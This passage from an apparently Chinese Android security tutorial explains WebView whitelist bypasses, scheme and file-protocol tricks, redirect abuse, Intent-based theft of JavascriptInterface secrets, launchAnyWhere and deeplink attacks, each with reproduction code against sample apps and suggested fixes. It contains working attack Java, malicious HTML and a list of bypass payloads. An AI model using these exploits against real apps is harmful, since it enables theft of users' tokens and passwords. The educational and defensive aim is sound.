class="literal">true</span>);</span><br><span class="line">   </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件<code>TestActivity.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"></span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>然后可以获得日志信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/48.png" alt="image-20220729212609157"></p><p>漏洞防护：</p><p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(intent.getData().toString());</span><br></pre></td></tr></table></figure><p>从 API 级别 28 (Android 9) 开始，<a href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p><h4 id="（3）URL-Scheme绕过"><a href="#（3）URL-Scheme绕过" class="headerlink" title="（3）URL Scheme绕过"></a>（3）URL Scheme绕过</h4><p><strong>漏洞原理：</strong></p><p>代码在进行URL校验是，检查了host，但是并未检查scheme，这样我们可以通过“javascript”进行绕过</p><p>例如：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/69.png" alt="image-20220730132455921"></p><p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p><p><strong>漏洞复现：</strong></p><p>我们打开一个样本：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/70.png" alt="image-20220730132644522"></p><p>然后进行构造html</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/71.png" alt="image-20220730132704180"></p><p>最后就绕过了校验，实现了XSS注入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/72.png" alt="image-20220730132735229"></p><p><strong>安全防护：</strong></p><p>URL校验函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/73.png" alt="image-20220730132918854"></p><p>Intent Scheme校验建议写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> intent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> intent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> intent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(intent，-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="（4）服务端跳转漏洞绕过"><a href="#（4）服务端跳转漏洞绕过" class="headerlink" title="（4）服务端跳转漏洞绕过"></a>（4）服务端跳转漏洞绕过</h4><p><strong>漏洞原理：</strong></p><p>⽩名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调⽤<code>javascriptInterface</code>，例如我们构造一个这样的URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><p>前面的<code>https://www.site1.com/redirect.php</code>是我们构造的虚拟的站点，当主机访问时，打开这个URL后，服务器会返回一个302响应，然后浏览器侧会斩词请求Location中指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p><p>然后我们就可以构造URL来绕过域名白名单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>首先我们编写攻击的htm：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们使用文件服务器来进行模拟</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/49.png" alt="image-20220730114753663"></p><p>我们接着编写测试样本代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</span><br></pre></td></tr></table></figure><p>然后我们启动应用：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/50.png" alt="image-20220730115108664"></p><p>我们点击白名单绕过按钮：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/51.png" alt="image-20220730115207759"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/52.png" alt="image-20220730122859092"></p><p>我们可以发现这里就成功的绕过了白名单进行跳转</p><p><strong>安全防护：</strong></p><p>此时可以在<code>shouldOverrideUrlLoading</code>函数中拦截跳转，并对跳转的Url进行检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(chechDomain(request.getUrl().toString()))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//通过检查，允许跳转</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//未通过检查，允许跳转</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而很多使用<code>shouldOverrideUrlLoading</code>,也是不安全的使用状态，这样还是会存在一些攻击，具体参考：<a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview"><strong>Android：访问受应用程序保护的组件</strong></a></p><h4 id="（5）file协议绕过"><a href="#（5）file协议绕过" class="headerlink" title="（5）file协议绕过"></a>（5）file协议绕过</h4><p>APP经常会使用file:&#x2F;&#x2F;协议加载本地文件，通常会限制在一些特定路径中，参考文章：<a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="comment">//”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；</span></span><br><span class="line">(<span class="number">2</span>)file:<span class="comment">///android_asset和file:///android_res 也可以../穿越</span></span><br><span class="line">(<span class="number">3</span>)白名单判断了“../，但通过“..\”也是可以穿越的，例如file:<span class="comment">///sdcard/..\../sdcard/1.html</span></span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="comment">//a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span></span><br><span class="line">(<span class="number">5</span>)file:<span class="comment">//baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的</span></span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="comment">///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html</span></span><br><span class="line">(<span class="number">7</span>)白名单判断了“../”，但通过url编码绕过，例如file:<span class="comment">///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx</span></span><br><span class="line">(<span class="number">8</span>)replace(“../“,””)可以使用”….<span class="comment">//“绕过</span></span><br></pre></td></tr></table></figure><h3 id="4-Intent-WebView漏洞"><a href="#4-Intent-WebView漏洞" class="headerlink" title="4.Intent+WebView漏洞"></a>4.Intent+WebView漏洞</h3><h4 id="（1）Intent访问导出组件加载恶意界面和窃取信息"><a href="#（1）Intent访问导出组件加载恶意界面和窃取信息" class="headerlink" title="（1）Intent访问导出组件加载恶意界面和窃取信息"></a>（1）Intent访问导出组件加载恶意界面和窃取信息</h4><p><strong>漏洞原理：</strong></p><p>主要通过 WebView 对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p><p><strong>漏洞复现：</strong></p><p>我们编写一个样例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p><p>我们将该组件设置为导出组件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/32.png" alt="image-20220729171422196"></p><p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p><p><strong>漏洞复现：</strong></p><p>我们再编写攻击样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;WebView Atack&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">password</span> <span class="operator">=</span> test.getPassword();</span><br><span class="line">document.getElementById(<span class="string">&quot;getdata&quot;</span>).innerHTML= password;</span><br><span class="line">         &#125;</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;p id=<span class="string">&quot;getdata&quot;</span>&gt;攻击获得的数据将显示在此……&lt;/p&gt;</span><br><span class="line">   &lt;!--点击按钮则调用callAndroid函数--&gt;</span><br><span class="line">   &lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;CIntent Attack!&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后启动http_server</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/33.png" alt="image-20220729172309137"></p><p>此时我们启动攻击样本，并点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/34.png" alt="image-20220729172422110"></p><p>这里我们可以成功的加载我们的页面说明恶意html注入成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/35.png" alt="image-20220729172443186"></p><p>然后我们再次点击js中的按钮，就可以获取敏感数据</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729172552889"></p><p>这里就获取的敏感的数据</p><h4 id="（2）Intent重定向导致launchAnyWhere漏洞"><a href="#（2）Intent重定向导致launchAnyWhere漏洞" class="headerlink" title="（2）Intent重定向导致launchAnyWhere漏洞"></a>（2）Intent重定向导致launchAnyWhere漏洞</h4><p><strong>漏洞原理：</strong></p><p>我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。</p><p>导出的组件一般有以下三种形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="literal">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="literal">false</span>，但是其intent-filter以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API Level在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="literal">true</span>，<span class="number">17</span>及以上默认值为<span class="literal">false</span>。</span><br></pre></td></tr></table></figure><p>未导出的组件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span> </span><br><span class="line">组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-filter,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure><p>而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p><strong>漏洞复现：</strong></p><p>我们查看一个样本案例：</p><p>首先是不可导出组件PrivateActivity:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/53.png" alt="image-20220730124850689"></p><p>然后可导出的组件：WebView2Activity</p><p>代码层的校验代码：</p><p><code>WebView2Activity</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/54.png" alt="image-20220730125041041"></p><p><code>PrivateActivity</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/55.png" alt="image-20220730125108657"></p><p>然后我们编写攻击代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/56.png" alt="image-20220730125254413"></p><p>效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/57.png" alt="image-20220730125323004"></p><p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/58.png" alt="image-20220730125359818"></p><h3 id="5-Deeplink-WebView漏洞"><a href="#5-Deeplink-WebView漏洞" class="headerlink" title="5.Deeplink+WebView漏洞"></a>5.Deeplink+WebView漏洞</h3><p>deeplink 是一种在网页中启动App的超链接。当用户点击deeplink链接时，Android系统会启动注册该deeplink的应用，打开在Manifest文件中注册该deeplink的activity。</p><p>deeplink在APP中会导致多类漏洞：通过deeplink操纵WebView造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。</p><h4 id="（1）任意代码执行漏洞"><a href="#（1）任意代码执行漏洞" class="headerlink" title="（1）任意代码执行漏洞"></a>（1）任意代码执行漏洞</h4><p><strong>漏洞原理：</strong></p><p>样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</p><p><strong>漏洞复现：</strong></p><p>样本代码段：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/59.png" alt="image-20220730125800892"></p><p>我们构造Poc：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/60.png" alt="image-20220730125820419"></p><p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/61.png" alt="image-20220730125901727"></p><p><strong>漏洞防护：</strong></p><p>需要对具体的包名进行校验，并对DeepLink进行过滤</p><h4 id="（2）XSS注入漏洞"><a href="#（2）XSS注入漏洞" class="headerlink" 